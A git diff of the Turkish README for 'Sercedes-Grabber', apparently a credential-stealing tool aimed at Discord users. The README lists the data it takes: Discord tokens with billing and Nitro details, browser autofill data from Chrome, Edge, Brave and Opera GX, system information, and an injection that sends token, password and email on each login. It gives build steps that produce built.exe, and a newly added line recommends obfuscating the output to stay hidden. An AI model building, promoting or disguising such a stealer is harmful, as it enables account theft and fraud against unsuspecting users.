@@ -3,7 +3,7 @@
 <img src="https://cdn.discordapp.com/attachments/1062070879418318929/1062094174691803256/sercedes_ust.png"> 
 
 ## Özellikler
-- Discord token Bilgisi
+- Discord Token Bilgisi
     - Nitro
     - Discord Rozetleri 
     - Discord Faturalandırma Bilgisi
@@ -19,7 +19,7 @@
     - Yer İmleçleri
     - Otomatik Doldurma
     - Chrome, Edge, Brave, Opera GX, ve daha fazlası...
-- Discord injection
+- Discord Değişen Bilgiler
     - Girişte veya şifre değiştirildiğinde token, şifre ve e-posta gönderir.
 - Sistem Bilgisi
     - Kullanıcı
@@ -49,11 +49,11 @@
 <details>
     <summary>Anlamayanlar İçin</summary>
     <ol>
-        <li><a href="https://github.com/Sercedes001/Sercedes-Grabber/archive/refs/heads/main.zip">Kaynak kodu zip'ini indir zip</a></li>
+        <li><a href="https://github.com/Sercedes001/Sercedes-Grabber/archive/refs/heads/main.zip">Kaynak Kodunu İndir</a></li>
         <li>Klasöre Çıkart</li>
-        <li> Çalıştır → <code>install_python.bat</code></li>
-        <li>Run the builder by double clicking the <code>build.bat</code> file</li>
-        <li>Follow instructions in builder and your exe will be in the same folder as <code>built.exe</code></li>
+        <li>Çalıştır →<code>install_python.bat</code></li>
+        <li>Çift Tıkla → <code>build.bat</code></li>
+        <li>Talimatları Takip Et Ve Aynı Dosyanın İçine <code>built.exe</code> Adlı Dosya Oluşacaktır</li>
     </ol>
 </details>
 <br>
@@ -64,10 +64,7 @@ cd Sercedes
 ./build.bat
 ```
 
-
-
-
-
+Daha Gizli Kalmak İçin <li><a href="https://obfuscator.io/">Obfuscatorlayın
 
 ## License
 
